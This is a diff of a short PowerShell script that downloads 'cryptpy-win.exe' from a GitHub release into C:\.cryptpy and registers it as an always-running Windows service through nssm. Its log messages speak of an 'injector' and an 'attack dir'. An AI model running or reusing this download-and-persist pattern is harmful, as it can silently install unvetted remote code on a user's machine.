@@ -1,10 +1,14 @@
 $version = $args[0] # Fetch version argument
 
+Copy-Item ".\nssm.exe" -Destination "C:\.cryptpy\nssm.exe"
+
 C:
 
 Write-Output "found injector version $version"
 
 mkdir 'C:\.cryptpy'
+
+Set-Location C:\.cryptpy
 
 $downloadUrl = "https://github.com/mitsukomegumi/CryptPy.js/releases/download/$version/cryptpy-win.exe" # Fetch latest build URL
 
@@ -22,6 +26,8 @@ Write-Output "found attack dir $downloadPath"
 
 Write-Output "attempting to install daemon at dir $downloadPath"
 
-"nssm install CryptPy $downloadPath\cryptpy-win.exe" | cmd # Register service
+Set-Location C:\.cryptpy
+
+".\nssm.exe install CryptPy $downloadPath\cryptpy-win.exe" | cmd # Register service
 
 Start-Service CryptPy # Start Service
